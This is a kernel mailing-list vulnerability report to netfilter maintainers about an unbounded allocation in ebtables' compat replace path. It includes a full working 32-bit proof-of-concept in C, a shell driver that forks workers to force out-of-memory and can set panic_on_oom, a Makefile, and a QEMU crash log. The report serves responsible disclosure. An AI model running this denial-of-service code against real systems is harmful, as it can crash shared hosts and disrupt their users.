Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.160.173
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792733181;
	b=gatTGagL4WGuEHWYuZ2tqsWF321fRtdtC2JlhLX0+Cjj37b02lPLN8opuIauAP0RV9sq
	 Pe3pmWl5yAj4UrGQfJ5r1ZqvAlXgyO87MbJmPsymdoOTnveE51THRDJid9isA8VRF3TWD
	 6bf4oTb2MST6UOjE2onk+xN+Y9mLq0d3w83yU/LZa0C//tJYdApLuIi0OxW5tXaZFo3VE
	 5Tre2Legz6hdSY+Yx7f7G19NAlTkeGQqF7Um8naj0FOkA2+gPZSFJRnsYrmmquyRDtRhW
	 INAUI5aNffBOom/zBdq/mKwQbpwyLzfd04AFohDZJIG8Ew8PTmsFy6TDNJpnECq1NHg==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792733181;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=emUWmh4lJJu+G3asB8sYNmQT8xDQqduT2mf3OsjQtMw=;
	b=mIdvhl8FK5bOZkxJMlrvMIstL0XcztjKh/y8pkXW+u2IEQWkUPBTohRoLxwor7lFuuS2
	 NCj3W5pMbd4hDrs7K9gBoKbnUFFZ8PKFjKAun5OLLTP24cv6Y4PcA6CSaMtxiyiUtLSe2
	 I42+4f07sPbymkVZwVcYC6k3cX9Gp1zileWGz3mc2GzH69CkYzktS23W0SAbv7lQ+y5rE
	 419arkQqzPHRExix0MrX0+gK1tSz+Abb9hzRrA/nNfp+BJAVZEnGim4meItSotMsbiEgM
	 /NWfSSy75kRAEIbxXXFbCdOYzAWGuKrg01Azpp+w1Kg0YvvlaQAIIAY6kKkQGu5m5dw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b="mhECuq/3";
	arc=none smtp.remote-ip=209.85.160.173
Received: from mail-qt1-f173.google.com (mail-qt1-f173.google.com [209.85.160.173])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 75701606A31D
	for <netfilter-devel@vger.kernel.org>; Fri, 23 Oct 2026 05:26:20 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 75701606A31D
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=mhECuq/3
Received: by mail-qt1-f173.google.com with SMTP id d75a77b69052e-536c8f958d7so251061cf.1
        for <netfilter-devel@vger.kernel.org>; Thu, 22 Oct 2026 22:26:20 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792733179; x=1793337979; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=emUWmh4lJJu+G3asB8sYNmQT8xDQqduT2mf3OsjQtMw=;
        b=mhECuq/3+yKBiInLX9KlzDnTQ3RostVmvzXC35a1p5308NH5KSdG/SCdy5T4YydNPm
         D9esC3UU+FyXvt8+tyljwp/0HZrl/LzBSd85D41AnJV0N3as4vHxJ4NjYPajB3EiBTkE
         Ii/J+ANL+SzANrkWN95FwJ/S05mAqzUS6ALmFjiXV0GcXoGWzbGwd2x813wFhTwAb89q
         NESavKQWkfx8PSNX46VJSkTfmSDZ0cB8+UgcAaWi4mErksa7nzIK16W4rGcSfaqQD2iA
         rWBuC9AyCILR1XD3a9JAsg/eE0rTBGdFfJzQ2/B1CP0tTr8MTAxIeSFxUXZuQEs4KXVq
         8r9g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792733179; x=1793337979;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=emUWmh4lJJu+G3asB8sYNmQT8xDQqduT2mf3OsjQtMw=;
        b=X09z8h461vWTqEav+WACz9P/AxFC759KBj8+N9sDfIRptvv3eVwNB9ytIC7nd6daxv
         8WhKrWBVGnh9t/mlnEsEEkGuYR70v9X8BAUMHvYyXafRqTq7eASTxkx4F8ZHP4VFdywi
         jKeNapZ1CMiICvDmyhQyuLvtEhhc679Cd4RLzFgE+l4wJ2eDdtdKiNptYwbfrNGaRZVM
         QVjvLBryOGBz9zocDja7q93nkBb0obpUpMpqbdkwcygtmXmdbwUNMSgYmSayqaQyurZm
         bK0ZT6sygGKNo7HOT7YA78SDbYgQ5XVykNC0FtAE+qql5evcMWMxpNKxxAzLwKRSXbpe
         lNjg==
X-Gm-Message-State: AFq9FYJmw6gmAJB/qIR3f4aO5wuwUbBbgxjntvrwrD+jx2g/bDxzf4hG
	9nkfRYzvXVTKyho9BbrlJxHJkHqJGtJfQHbN2xRA8/zhZ8MzlZynDQjri8KoDPtxeZ6beRQ9Lss
	oAe24GSl6sr4=
X-Gm-Gg: AYBFou1zXv1HIyATR4hyQJEs3xt+sgxAZJnwFp0JDkTpbMtqH/p7eo8icQQhHTZKRqO
	r0pTPfDbgBE/e0Q2yg0ZVqzrET1DhAbs+ewbk6z+/Df9UsDqKxlfCn0xpPMWvixf78n4TICTN6E
	lI+ZJDxXUj884LoIEtVPRDDZYRrrlygG3amqLQjNhPXI8SNyas35w3fmNXuiX+8ojztzd6YYRAL
	tLVqx8z/pg0LpshSIR4NZ0cJsoivDp5izwrdzvlIcOdtLM5G3ocpnSr2aGBajth3gHuQUXFviUN
	LjZ1szN0USKaLh5AJgrCP4CdHY/Wo6+Q9LrRyf8LdvRQwJV1Z29ymrKmqcDOsB53inMXfN1JK/T
	9/Jp33VHbuWZE+HCUWNm+OAPrLsiLuLdQt8o+yBNrNYT6hvk3trdmaX+/QxVUmMtYeYrFnkMiiz
	oHAISs7mROtv7MNnJQSNRYDIkbVkREheN8K5AXWwSYJcoCD2WcUAyj50MnG7G4RrTT/WSa9cHun
	xaq2BXhaXJv4G8299de76my9L4r8M8RbMS0Q0DJIlbtgm8P7hDrq8kvAre+n+otkTro7Y8=
X-Received: by 2002:a05:622a:2286:b0:533:94fc:1e75 with SMTP id d75a77b69052e-536c213675emr14346381cf.2.1792733178982;
        Thu, 22 Oct 2026 22:26:18 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([203.175.14.54])
        by smtp.gmail.com with ESMTPSA id d75a77b69052e-536c17f4b5csm9255441cf.14.2026.10.22.22.26.15
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 22 Oct 2026 22:26:18 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netfilter-devel@vger.kernel.org,
	bridge@lists.linux.dev
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	razor@blackwall.org,
	idosch@nvidia.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH nf 0/1] netfilter: ebtables: validate compat nentries
Date: Fri, 23 Oct 2026 13:26:07 +0800
Message-ID: <cover.1792733039.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Post: <mailto:netfilter-devel@vger.kernel.org>
List-Help: <mailto:netfilter-devel+help@vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netfilter-devel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an unbounded allocation in the ebtables compat
replacement path, net/bridge/netfilter/ebtables.c. A user with
CAP_NET_ADMIN in a user and network namespace can reach the 32-bit
compat syscall with a forged rule count and a small entry blob.

We will provide details of the bug below, along with a PoC and the
QEMU crash log.

---- details below ----

Bug details:

compat_do_replace() allocates its per-CPU counter area from the compat
header's nentries before copying and parsing the rule blob. The existing
MAX_EBT_ENTRIES bound limits the count for integer-overflow reasons, but
does not check that the claimed number of rules can fit in entries_size.
A request can therefore claim millions of rules while supplying only a
single empty base chain. The kernel attempts the large vmalloc() before
later validation rejects the malformed table.

Each rule occupies at least sizeof(struct ebt_entry) bytes in the input
blob. Rejecting a claimed count larger than entries_size divided by
that minimum rule size prevents the allocation from being driven by an
inconsistent count.

The PoC is a static 32-bit program that invokes EBT_SO_SET_ENTRIES with
nentries=16000000 and entries_size set to one empty base chain. The
syscall is rejected after the vulnerable counter allocation. A single
call demonstrates the oversized request; multiple workers can amplify
memory pressure to OOM.

Reproducer:

    make
    unshare -Urn /bin/sh -c "./poc 250000"

This exercises the compat path with namespace-local CAP_NET_ADMIN. To
reproduce the supplied OOM log in a disposable QEMU guest, run as root:

    NENTRIES=16000000 CHILDREN=4 ./poc.sh crash-root

The crash log is from a 2 vCPU, 4 GB x86 QEMU guest running Linux
6.12.95. The guest had CONFIG_BRIDGE_NF_EBTABLES,
CONFIG_BRIDGE_NF_EBTABLES_LEGACY, CONFIG_NETFILTER_XTABLES_COMPAT,
CONFIG_COMPAT, and IA32 emulation enabled.

------BEGIN poc.c------

#define AF_INET 2
#define SOCK_STREAM 1
#define IPPROTO_IP 0

#define EBT_TABLE_MAXNAMELEN 32
#define EBT_CHAIN_MAXNAMELEN EBT_TABLE_MAXNAMELEN
#define NF_BR_NUMHOOKS 6
#define EBT_ACCEPT (-1)
#define EBT_BASE_CTL 128
#define EBT_SO_SET_ENTRIES EBT_BASE_CTL

#define __NR_exit 1
#define __NR_write 4
#define __NR_close 6
#define __NR_fork 2
#define __NR_pause 29
#define __NR_socketcall 102

#define SYS_SOCKET 1
#define SYS_SETSOCKOPT 14

#define DEFAULT_NENTRIES 16000000U
#define DEFAULT_CHILDREN 0U

struct ebt_entries;

struct ebt_replace {
	char name[EBT_TABLE_MAXNAMELEN];
	unsigned int valid_hooks;
	unsigned int nentries;
	unsigned int entries_size;
	struct ebt_entries *hook_entry[NF_BR_NUMHOOKS];
	unsigned int num_counters;
	void *counters;
	char *entries;
};

struct ebt_entries {
	unsigned int distinguisher;
	char name[EBT_CHAIN_MAXNAMELEN];
	unsigned int counter_offset;
	int policy;
	unsigned int nentries;
};

struct payload {
	struct ebt_replace repl;
	struct ebt_entries chain;
};

static long sys_call0(long nr)
{
	long ret;

	__asm__ volatile("int $0x80"
			 : "=a"(ret)
			 : "a"(nr)
			 : "memory");
	return ret;
}

static long sys_call1(long nr, long a1)
{
	long ret;

	__asm__ volatile("int $0x80"
			 : "=a"(ret)
			 : "a"(nr), "b"(a1)
			 : "memory");
	return ret;
}

static long sys_call2(long nr, long a1, long a2)
{
	long ret;

	__asm__ volatile("int $0x80"
			 : "=a"(ret)
			 : "a"(nr), "b"(a1), "c"(a2)
			 : "memory");
	return ret;
}

static long sys_call3(long nr, long a1, long a2, long a3)
{
	long ret;

	__asm__ volatile("int $0x80"
			 : "=a"(ret)
			 : "a"(nr), "b"(a1), "c"(a2), "d"(a3)
			 : "memory");
	return ret;
}

static long sys_socketcall(int call, unsigned long *args)
{
	return sys_call2(__NR_socketcall, call, (long)args);
}

static long sys_write(int fd, const void *buf, unsigned int len)
{
	return sys_call3(__NR_write, fd, (long)buf, len);
}

static long sys_close(int fd)
{
	return sys_call1(__NR_close, fd);
}

static long sys_fork(void)
{
	return sys_call0(__NR_fork);
}

static long sys_pause(void)
{
	return sys_call0(__NR_pause);
}

static unsigned int c_strlen(const char *s)
{
	unsigned int len = 0;

	while (s[len])
		len++;
	return len;
}

static void put_str(const char *s)
{
	sys_write(1, s, c_strlen(s));
}

static void put_ch(char c)
{
	sys_write(1, &c, 1);
}

static void put_u32(unsigned int v)
{
	char buf[16];
	unsigned int i = 0;

	if (v == 0) {
		put_ch('0');
		return;
	}

	while (v) {
		buf[i++] = '0' + (v % 10);
		v /= 10;
	}

	while (i)
		put_ch(buf[--i]);
}

static void put_s32(long v)
{
	if (v < 0) {
		put_ch('-');
		put_u32((unsigned int)(-v));
		return;
	}
	put_u32((unsigned int)v);
}

static void mem_zero(void *dst, unsigned int len)
{
	unsigned char *p = dst;
	unsigned int i;

	for (i = 0; i < len; i++)
		p[i] = 0;
}

static void mem_copy(void *dst, const char *src, unsigned int len)
{
	unsigned char *d = dst;
	unsigned int i;

	for (i = 0; i < len; i++)
		d[i] = (unsigned char)src[i];
}

static unsigned int parse_u32(const char *s, unsigned int def)
{
	unsigned int v = 0;
	unsigned int seen = 0;

	if (!s || !*s)
		return def;

	while (*s) {
		if (*s < '0' || *s > '9')
			return def;
		v = v * 10 + (*s - '0');
		seen = 1;
		s++;
	}

	return seen ? v : def;
}

static int do_trigger(unsigned int nentries, int verbose)
{
	struct payload p;
	unsigned long socket_args[3];
	unsigned long setopt_args[5];
	long fd;
	long ret;

	mem_zero(&p, sizeof(p));
	mem_copy(p.repl.name, "filter", 6);
	p.repl.valid_hooks = 1U;
	p.repl.nentries = nentries;
	p.repl.entries_size = sizeof(p.chain);
	p.repl.hook_entry[0] = (struct ebt_entries *)p.repl.entries;
	p.repl.entries = (char *)&p.chain;

	p.chain.distinguisher = 0;
	mem_copy(p.chain.name, "INPUT", 5);
	p.chain.counter_offset = 0;
	p.chain.policy = EBT_ACCEPT;
	p.chain.nentries = 0;

	/* SOCK_STREAM avoids needing CAP_NET_RAW; CAP_NET_ADMIN is enough. */
	socket_args[0] = AF_INET;
	socket_args[1] = SOCK_STREAM;
	socket_args[2] = 0;

	fd = sys_socketcall(SYS_SOCKET, socket_args);
	if (fd < 0) {
		put_str("socket failed: ");
		put_s32(fd);
		put_ch('\n');
		return 1;
	}

	setopt_args[0] = (unsigned long)fd;
	setopt_args[1] = IPPROTO_IP;
	setopt_args[2] = EBT_SO_SET_ENTRIES;
	setopt_args[3] = (unsigned long)&p;
	setopt_args[4] = sizeof(p);

	ret = sys_socketcall(SYS_SETSOCKOPT, setopt_args);
	if (verbose) {
		put_str("setsockopt ret=");
		put_s32(ret);
		put_str(" nentries=");
		put_u32(nentries);
		put_ch('\n');
	}

	sys_close((int)fd);
	return ret < 0 ? (int)(-ret) : 0;
}

static __attribute__((noreturn)) void child_loop(unsigned int nentries)
{
	for (;;)
		do_trigger(nentries, 0);
}

static int spawn_children(unsigned int nentries, unsigned int children)
{
	unsigned int i;

	for (i = 0; i < children; i++) {
		long pid = sys_fork();

		if (pid == 0)
			child_loop(nentries);
		if (pid < 0) {
			put_str("fork failed: ");
			put_s32(pid);
			put_ch('\n');
			return 1;
		}
	}

	put_str("spawned children=");
	put_u32(children);
	put_str(" nentries=");
	put_u32(nentries);
	put_ch('\n');

	for (;;)
		sys_pause();
}

int main(int argc, char **argv)
{
	unsigned int nentries = DEFAULT_NENTRIES;
	unsigned int children = DEFAULT_CHILDREN;

	if (argc > 1)
		nentries = parse_u32(argv[1], DEFAULT_NENTRIES);
	if (argc > 2)
		children = parse_u32(argv[2], DEFAULT_CHILDREN);

	if (children)
		return spawn_children(nentries, children);
	return do_trigger(nentries, 1);
}

__asm__(
".global _start\n"
"_start:\n"
"    xor %ebp, %ebp\n"
"    pop %eax\n"
"    mov %esp, %ebx\n"
"    push %ebx\n"
"    push %eax\n"
"    call main\n"
"    mov %eax, %ebx\n"
"    mov $1, %eax\n"
"    int $0x80\n"
);

------END poc.c--------

------BEGIN poc.sh------

#!/bin/sh
set -eu

MODE=${1:-single}
NENTRIES=${NENTRIES:-16000000}

case "$MODE" in
single)
	exec ./poc "$NENTRIES"
	;;
observe-root)
	CHILDREN=${CHILDREN:-2}
	grep -E '^(MemAvailable|VmallocUsed):' /proc/meminfo
	./poc "$NENTRIES" "$CHILDREN" >/tmp/ebt-compat-root.log 2>&1 &
	sleep 4
	echo ---during---
	grep -E '^(MemAvailable|VmallocUsed):' /proc/meminfo
	killall -q poc || true
	sleep 2
	echo ---settled---
	grep -E '^(MemAvailable|VmallocUsed):' /proc/meminfo
	head -20 /tmp/ebt-compat-root.log || true
	;;
observe-userns)
	CHILDREN=${CHILDREN:-2}
	grep -E '^(MemAvailable|VmallocUsed):' /proc/meminfo
	unshare -Urn /bin/sh -c "./poc \"$NENTRIES\" \"$CHILDREN\"" >/tmp/ebt-compat-userns.log 2>&1 &
	sleep 4
	echo ---during---
	grep -E '^(MemAvailable|VmallocUsed):' /proc/meminfo
	killall -q poc || true
	sleep 2
	echo ---settled---
	grep -E '^(MemAvailable|VmallocUsed):' /proc/meminfo
	head -20 /tmp/ebt-compat-userns.log || true
	;;
crash-root)
	echo 0 > /proc/sys/kernel/panic_on_warn
	echo 2 > /proc/sys/vm/panic_on_oom
	echo 0 > /proc/sys/vm/oom_dump_tasks
	echo 8 4 1 7 > /proc/sys/kernel/printk
	CHILDREN=${CHILDREN:-4}
	exec ./poc "$NENTRIES" "$CHILDREN"
	;;
*)
	echo "usage: $0 [single|observe-root|observe-userns|crash-root]" >&2
	exit 1
	;;
esac

------END poc.sh--------

------BEGIN Makefile------

CC := gcc
CFLAGS := -m32 -nostdlib -static -fno-pic -fno-builtin -no-pie -Os -Wall -Wextra
LDFLAGS := -Wl,--build-id=none

all: poc

poc: poc.c
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $<

clean:
	rm -f poc

------END Makefile--------

----BEGIN crash log----

[  671.059225][T11148] poc invoked oom-killer: gfp_mask=0x2cc2(GFP_KERNEL|__GFP_HIGHMEM|__GFP_NOWARN), order=0, oom_score_adj=0
[  671.060128][T11148] CPU: 1 UID: 0 PID: 11148 Comm: poc Not tainted 6.12.95 #2
[  671.060133][T11148] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  671.060145][T11148] Call Trace:
[  671.060169][T11148]  <TASK>
[  671.060174][T11148]  dump_stack_lvl+0x9e/0xe0
[  671.060224][T11148]  dump_header+0xf9/0x800
[  671.060284][T11148]  out_of_memory+0x716/0x1430
[  671.060298][T11148]  ? __alloc_pages_noprof+0xd53/0x26d0
[  671.060324][T11148]  ? __pfx_out_of_memory+0x10/0x10
[  671.060331][T11148]  ? lock_acquire+0x2f/0xb0
[  671.060347][T11148]  ? __alloc_pages_noprof+0xd53/0x26d0
[  671.060367][T11148]  __alloc_pages_noprof+0x1ecc/0x26d0
[  671.060405][T11148]  ? __pfx___alloc_pages_noprof+0x10/0x10
[  671.060412][T11148]  ? __pfx_vmap_small_pages_range_noflush+0x10/0x10
[  671.060424][T11148]  ? __vmalloc_node_range_noprof+0x33a/0x1090
[  671.060464][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.060478][T11148]  ? alloc_pages_bulk_array_mempolicy_noprof+0x1d4/0xd70
[  671.060501][T11148]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[  671.060513][T11148]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[  671.060519][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.060525][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.060532][T11148]  ? __pfx___might_resched+0x10/0x10
[  671.060568][T11148]  __vmalloc_node_range_noprof+0x584/0x1090
[  671.060586][T11148]  ? compat_do_replace+0x183/0x710
[  671.060626][T11148]  ? __pfx___vmalloc_node_range_noprof+0x10/0x10
[  671.060650][T11148]  ? compat_do_replace+0x183/0x710
[  671.060660][T11148]  vmalloc_noprof+0x6b/0x90
[  671.060667][T11148]  ? compat_do_replace+0x183/0x710
[  671.060674][T11148]  compat_do_replace+0x183/0x710
[  671.060678][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.060691][T11148]  ? __pfx_compat_do_replace+0x10/0x10
[  671.060706][T11148]  ? __pfx_aa_get_newest_label+0x10/0x10
[  671.060750][T11148]  ? apparmor_capable+0xb9/0x180
[  671.060760][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.060764][T11148]  ? security_capable+0x8a/0x150
[  671.060788][T11148]  do_ebt_set_ctl+0x31a/0x390
[  671.060799][T11148]  ? __pfx_do_ebt_set_ctl+0x10/0x10
[  671.060810][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.060832][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.060846][T11148]  nf_setsockopt+0x76/0xe0
[  671.060881][T11148]  do_sock_setsockopt+0x1b8/0x3b0
[  671.060903][T11148]  ? __pfx_do_sock_setsockopt+0x10/0x10
[  671.060908][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.060911][T11148]  ? find_held_lock+0x2d/0x110
[  671.060930][T11148]  ? __might_fault+0xb6/0x120
[  671.060952][T11148]  ? lock_acquire+0x2f/0xb0
[  671.060969][T11148]  __sys_setsockopt+0x144/0x1c0
[  671.060990][T11148]  __do_compat_sys_socketcall+0x3ec/0x5d0
[  671.061003][T11148]  ? do_user_addr_fault+0x8be/0xe10
[  671.061020][T11148]  ? __pfx___do_compat_sys_socketcall+0x10/0x10
[  671.061034][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.061037][T11148]  ? lock_acquire+0x2f/0xb0
[  671.061065][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.061086][T11148]  do_int80_emulation+0xfc/0x1f0
[  671.061109][T11148]  asm_int80_emulation+0x1a/0x20
[  671.061117][T11148] RIP: 0023:0x804933e
[  671.061147][T11148] Code: Unable to access opcode bytes at 0x8049314.
[  671.061151][T11148] RSP: 002b:00000000ffd96130 EFLAGS: 00000246 ORIG_RAX: 0000000000000066
[  671.061162][T11148] RAX: ffffffffffffffda RBX: 000000000000000e RCX: 00000000ffd9615c
[  671.061165][T11148] RDX: 0000000000000000 RSI: 0000000000000066 RDI: 00000000ffd96170
[  671.061167][T11148] RBP: 00000000ffd96208 R08: 0000000000000000 R09: 0000000000000000
[  671.061169][T11148] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
[  671.061171][T11148] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[  671.061204][T11148]  </TASK>
[  671.061207][T11148] Mem-Info:
[  671.084424][T11148] active_anon:4746 inactive_anon:3755 isolated_anon:0
[  671.084424][T11148]  active_file:102 inactive_file:28 isolated_file:0
[  671.084424][T11148]  unevictable:7259 dirty:127 writeback:0
[  671.084424][T11148]  slab_reclaimable:14299 slab_unreclaimable:65428
[  671.084424][T11148]  mapped:2008 shmem:1677 pagetables:533
[  671.084424][T11148]  sec_pagetables:0 bounce:0
[  671.084424][T11148]  kernel_misc_reclaimable:0
[  671.084424][T11148]  free:17980 free_pcp:3613 free_cma:0
[  671.088451][T11148] Node 0 active_anon:17612kB inactive_anon:16392kB active_file:144kB inactive_file:376kB unevictable:29036kB isolated(anon):0kB isolated(file):0kB mapped:8032kB dirty:508kB writeback:0kB shmem:6708kB shmem_thp:0kB shmem_pmdmapped:0kB anon_thp:0kB writeback_tmp:0kB kernel_stack:10208kB pagetables:2132kB sec_pagetables:0kB all_unreclaimable? yes
[  671.091045][T11148] Node 0 DMA free:12172kB boost:0kB min:340kB low:424kB high:508kB reserved_highatomic:0KB active_anon:0kB inactive_anon:0kB active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB present:15992kB managed:15360kB mlocked:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB
[  671.093044][T11148] lowmem_reserve[]: 0 2589 2961 2961 2961
[  671.093541][T11148] Node 0 DMA32 free:53508kB boost:0kB min:58812kB low:73512kB high:88212kB reserved_highatomic:0KB active_anon:16604kB inactive_anon:17112kB active_file:300kB inactive_file:220kB unevictable:25584kB writepending:508kB present:3129216kB managed:2670800kB mlocked:25584kB bounce:0kB free_pcp:12168kB local_pcp:3804kB free_cma:0kB
[  671.095805][T11148] lowmem_reserve[]: 0 0 371 371 371
[  671.096224][T11148] Node 0 Normal free:6064kB boost:0kB min:8428kB low:10532kB high:12636kB reserved_highatomic:0KB active_anon:0kB inactive_anon:328kB active_file:8kB inactive_file:56kB unevictable:3452kB writepending:0kB present:1048576kB managed:380124kB mlocked:380kB bounce:0kB free_pcp:2316kB local_pcp:144kB free_cma:0kB
[  671.098427][T11148] lowmem_reserve[]: 0 0 0 0 0
[  671.098818][T11148] Node 0 DMA: 1*4kB (U) 3*8kB (U) 7*16kB (U) 0*32kB 0*64kB 0*128kB 1*256kB (U) 1*512kB (U) 1*1024kB (U) 1*2048kB (M) 2*4096kB (M) = 12172kB
[  671.100007][T11148] Node 0 DMA32: 666*4kB (M) 715*8kB (UME) 472*16kB (UME) 239*32kB (UME) 147*64kB (UME) 69*128kB (UM) 26*256kB (M) 9*512kB (M) 0*1024kB 0*2048kB 0*4096kB = 53088kB
[  671.101355][T11148] Node 0 Normal: 32*4kB (M) 12*8kB (M) 12*16kB (M) 34*32kB (UM) 19*64kB (UM) 18*128kB (U) 3*256kB (U) 0*512kB 0*1024kB 0*2048kB 0*4096kB = 5792kB
[  671.102568][T11148] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=1048576kB
[  671.103247][T11148] Node 0 hugepages_total=4 hugepages_free=4 hugepages_surp=0 hugepages_size=2048kB
[  671.103930][T11148] 3673 total pagecache pages
[  671.104296][T11148] 0 pages in swap cache
[  671.104616][T11148] Free swap  = 0kB
[  671.104903][T11148] Total swap = 0kB
[  671.105196][T11148] 1048446 pages RAM
[  671.105490][T11148] 0 pages HighMem/MovableOnly
[  671.105848][T11148] 281875 pages reserved
[  671.106168][T11148] 0 pages cma reserved
[  671.106498][T11148] Unreclaimable slab info:
[  671.106931][T11148] Name                      Used          Total
[  671.107955][T11148] bio-360                    1KB         15KB
[  671.108440][T11148] bio-424                    2KB         15KB
[  671.108915][T11148] bio-440                    1KB         15KB
[  671.109404][T11148] bio-536                    1KB         15KB
[  671.109874][T11148] AF_VSOCK                   2KB         31KB
[  671.110361][T11148] TIPC                       3KB         31KB
[  671.110830][T11148] SCTPv6                     4KB         30KB
[  671.111307][T11148] DCCPv6                     5KB         31KB
[  671.111769][T11148] DCCP                       5KB         29KB
[  671.112265][T11148] RXRPC                      3KB         31KB
[  671.112739][T11148] rxrpc_call_jar            36KB         92KB
[  671.113321][T11148] fib6_node                  2KB          4KB
[  671.113792][T11148] ip6_dst_cache              2KB         15KB
[  671.114281][T11148] RAWv6                     38KB         64KB
[  671.114731][T11148] UDPv6                     10KB         61KB
[  671.115198][T11148] TCPv6                     14KB         31KB
[  671.115729][T11148] scsi_sense_cache           2KB          7KB
[  671.116195][T11148] virtio_scsi_cmd           24KB         31KB
[  671.116678][T11148] bio-136                   43KB         46KB
[  671.117210][T11148] bio-264                    1KB         15KB
[  671.117660][T11148] mqueue_inode_cache          1KB         31KB
[  671.118148][T11148] f2fs_bio_post_read_ctx         27KB         30KB
[  671.118742][T11148] jfs_mp                     9KB         15KB
[  671.119242][T11148] cifs_small_rq             18KB         31KB
[  671.119715][T11148] cifs_request              67KB         67KB
[  671.120181][T11148] cifs_mpx_ids               0KB          7KB
[  671.120657][T11148] cifs_io_subrequest         50KB         56KB
[  671.121129][T11148] cifs_io_request           93KB         95KB
[  671.121619][T11148] nfs_commit_data            3KB         15KB
[  671.122072][T11148] nfs_write_data            36KB         63KB
[  671.122479][T11148] jbd2_inode                 2KB          3KB
[  671.122932][T11148] ext4_system_zone           1KB         19KB
[  671.123499][T11148] ext4_io_end_vec            0KB          3KB
[  671.123977][T11148] kioctx                     0KB         30KB
[  671.124439][T11148] aio_kiocb                  0KB          7KB
[  671.124931][T11148] rpc_buffers               18KB         31KB
[  671.125403][T11148] rpc_tasks                  3KB          7KB
[  671.125867][T11148] UNIX-STREAM              190KB        275KB
[  671.126344][T11148] UNIX                     142KB        214KB
[  671.126816][T11148] tcp_bind2_bucket           1KB          4KB
[  671.127381][T11148] tcp_bind_bucket            1KB          4KB
[  671.127855][T11148] ip_fib_trie                1KB          3KB
[  671.128319][T11148] ip_fib_alias               1KB          3KB
[  671.128788][T11148] rtable                     3KB         31KB
[  671.129253][T11148] RAW                       22KB         31KB
[  671.129721][T11148] UDP                       12KB         64KB
[  671.130188][T11148] request_sock_TCP           0KB          7KB
[  671.130661][T11148] TCP                       23KB         29KB
[  671.131101][T11148] hugetlbfs_inode_cache          3KB         30KB
[  671.131613][T11148] netfs_subrequest          37KB         39KB
[  671.132086][T11148] netfs_request             93KB         95KB
[  671.132542][T11148] bio-256                   14KB         15KB
[  671.132993][T11148] ep_head                   15KB         32KB
[  671.133492][T11148] eventpoll_pwq             25KB         47KB
[  671.133961][T11148] eventpoll_epi             49KB        109KB
[  671.134433][T11148] inotify_inode_mark         34KB         38KB
[  671.134907][T11148] sgpool-128                 8KB         30KB
[  671.135482][T11148] sgpool-64                  4KB         31KB
[  671.135946][T11148] sgpool-32                  2KB         62KB
